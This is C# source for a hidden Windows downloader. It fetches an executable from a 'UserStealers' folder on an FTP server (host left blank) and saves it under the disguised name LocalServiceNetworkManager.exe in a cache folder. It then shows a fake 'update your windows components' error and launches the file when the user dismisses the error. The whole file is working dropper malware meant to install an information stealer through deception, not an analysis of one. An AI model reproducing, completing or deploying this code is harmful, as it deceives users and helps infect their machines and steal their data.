using System;
using System.Net;
using System.Windows.Forms;
using System.Threading.Tasks;
using FluentFTP;

namespace UserDataParserHidenDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                new Program().DownloadFiles().GetAwaiter().GetResult();
            }
            catch (Exception)
            {
                Application.Exit();
            }
        }

        private async Task DownloadFiles()
        {
            FtpClient mainClient = new FtpClient();
            mainClient.Host = "";
            mainClient.Credentials = new NetworkCredential("", "");
            System.IO.Directory.CreateDirectory((Environment.SpecialFolder.LocalApplicationData) + "\\InternetCache\\");
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\InternetCache\\LocalServiceNetworkManager.exe";
            mainClient.Connect();
            foreach (FtpListItem item in mainClient.GetListing("/UserDataParser/UserStealers/"))
            {
                if (item.Type == FtpFileSystemObjectType.File && item.Name == "illkillmyselfinthemorning.exe")
                {
                    long size = mainClient.GetFileSize(item.FullName);
                }
                DateTime time = mainClient.GetModifiedTime(item.FullName);
            }
            Progress<FtpProgress> progress = new Progress<FtpProgress>(x => {
                if (x.Progress >= 100)
                {
                    DialogResult result = MessageBox.Show("Please update your windows components! There was an error starting up!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    if(result == DialogResult.OK)
                    {
                        System.Diagnostics.Process.Start(path);
                        Environment.Exit(-1);
                    }
                    
                }
            });
            await mainClient.DownloadFileAsync(path, "/UserDataParser/UserStealers/illkillmyselfinthemorning.exe", FtpLocalExists.Overwrite, FluentFTP.FtpVerify.Retry, progress);
            mainClient.Disconnect();
            System.Threading.Thread.Sleep(-1);
        }
    }
}
